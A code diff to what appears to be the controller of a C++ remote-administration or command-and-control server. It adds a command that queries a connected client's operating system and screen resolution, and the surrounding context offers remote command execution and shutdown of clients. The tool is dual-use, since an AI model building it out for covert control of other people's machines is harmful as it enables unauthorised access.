@@ -47,7 +47,7 @@ static void introduceClient(void* sock) {
 
     if(document["res"].IsString()) {
         if(strcmp(document["res"].GetString(), "details") == 0) {
-            cout << "Got client info: " << buffer << "\n\n";
+            cout << "Client Connected" << endl << ">> ";
             clients.push_back(Socket); // Store client
             return; // All good to go, end it here
         }
@@ -98,6 +98,53 @@ static void listen(void* arg) {
     
     cout << "Closing listen thread...\n";
     ExitThread(0);
+}
+
+static void infoClientCommand(int socketInput) {
+	int Socket = socketInput;
+
+	// Send shutdown request to client
+	rapidjson::StringBuffer s;
+    rapidjson::Writer<rapidjson::StringBuffer> writer(s);
+    writer.StartObject();
+    writer.String("req");
+    writer.String("details");
+    writer.EndObject();
+    const char *message = s.GetString();
+    send(Socket, message, strlen(message), 0);
+    int receivedMsg;
+
+	// Receive data
+	char buffer[1024] = "";
+
+	// Ten second timeout length
+	int stamp = time(NULL)+10;
+	while(1) {
+		receivedMsg = recv(Socket, buffer, sizeof(buffer), 0);
+		if(receivedMsg >= 1) break;
+		if(time(NULL) > stamp) break;
+	}
+
+	if(receivedMsg <= 0) {
+        cout << "Received an error when reading from client. Not sure if the shutdown was executed successfully.\n";
+        return; // Ignore errors
+    }
+
+	rapidjson::Document document;
+    if (document.Parse<0>(buffer).HasParseError()) {
+        cout << "Error parsing reply from client. Not sure if the command was executed successfully.\n";
+        return; // Skip if error parsing
+    }
+
+	if(document["res"].IsString()) {
+        if(strcmp(document["res"].GetString(), "details") == 0) {
+			if(document["os"]["name"].IsString()) {
+				cout << "Client info: " << endl;
+				cout << "Operating System: " << document["os"]["name"].GetString() << endl;
+				cout << "Screen Resolution: " << document["os"]["resolution"].GetString() << endl;
+			}
+        }
+    }
 }
 
 static void shutdownClientCommand(const char *msg, int socketInput) {
@@ -266,10 +313,20 @@ int main()
                 cout << "Usage: client info [clientID]. Get clientID from 'list clients'.\n";
                 continue;
             }
-            
+
             const char *argument = args[2].c_str();
             int clientID = atoi(argument);
-            // (To Do)
+            int clientSocket;
+
+			try {
+                clientSocket = clients.at(clientID);
+            } catch(exception e) {
+                cout << "Error: Could not find a client with the given ID.\n";
+                continue;
+            }
+
+			cout << "Requesting info from Client #" << clientID << "...\n";
+			infoClientCommand(clients[clientID]);
         } else if(input.compare(0, std::string("execute").length(), std::string("execute")) == 0) {
             if(args.size() != 3) {
                 cout << "Usage: execute [clientID] [command]. Get clientID from 'list clients'.\n";
